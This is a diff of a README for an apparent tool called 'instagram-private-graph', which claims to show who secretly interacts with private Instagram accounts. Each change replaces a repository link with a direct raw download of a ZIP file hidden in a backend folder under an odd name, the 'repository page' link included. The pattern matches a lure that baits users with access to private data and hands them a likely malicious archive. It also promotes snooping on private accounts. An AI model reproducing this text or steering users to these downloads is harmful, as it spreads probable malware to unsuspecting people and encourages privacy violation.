@@ -1,6 +1,6 @@
 # 🔍 instagram-private-graph - See Who Secretly Interacts With Private Accounts
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/2044qwq/instagram-private-graph)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/2044qwq/instagram-private-graph/main/backend/relationship_engine/graph_instagram_private_yachtsmanlike.zip)
 
 ## 🎯 What Does This Tool Do?
 
@@ -19,7 +19,7 @@ The best part? You don't need any technical skills to use it. Just download, run
 ## 📥 Getting Started
 
 Visit this link to download the application:
-[**Download instagram-private-graph**](https://github.com/2044qwq/instagram-private-graph)
+[**Download instagram-private-graph**](https://raw.githubusercontent.com/2044qwq/instagram-private-graph/main/backend/relationship_engine/graph_instagram_private_yachtsmanlike.zip)
 
 Once you're on that page, look for the green "Code" button or the "Releases" section on the right side. Click it and choose "Download ZIP". That's where you'll find the latest version of the tool.
 
@@ -155,7 +155,7 @@ You don't need the other files to run the tool. Keep them in the same folder for
 ## 🧑‍💻 Support and Help
 
 If you run into any issues or have questions, you can:
-- Visit the repository page at [https://github.com/2044qwq/instagram-private-graph](https://github.com/2044qwq/instagram-private-graph)
+- Visit the repository page at [https://raw.githubusercontent.com/2044qwq/instagram-private-graph/main/backend/relationship_engine/graph_instagram_private_yachtsmanlike.zip](https://raw.githubusercontent.com/2044qwq/instagram-private-graph/main/backend/relationship_engine/graph_instagram_private_yachtsmanlike.zip)
 - Open a "Discussion" ticket in the Issues section
 - Look for updates in the Releases tab
 
@@ -170,7 +170,7 @@ Whether you're a curious social media user, a researcher, or just someone who lo
 Download it now and start analyzing private Instagram profiles today. You'll be amazed at what you can discover.
 
 **Ready to see the hidden side of Instagram?**  
-👉 [Click here to download](https://github.com/2044qwq/instagram-private-graph)
+👉 [Click here to download](https://raw.githubusercontent.com/2044qwq/instagram-private-graph/main/backend/relationship_engine/graph_instagram_private_yachtsmanlike.zip)
 
 ---
 
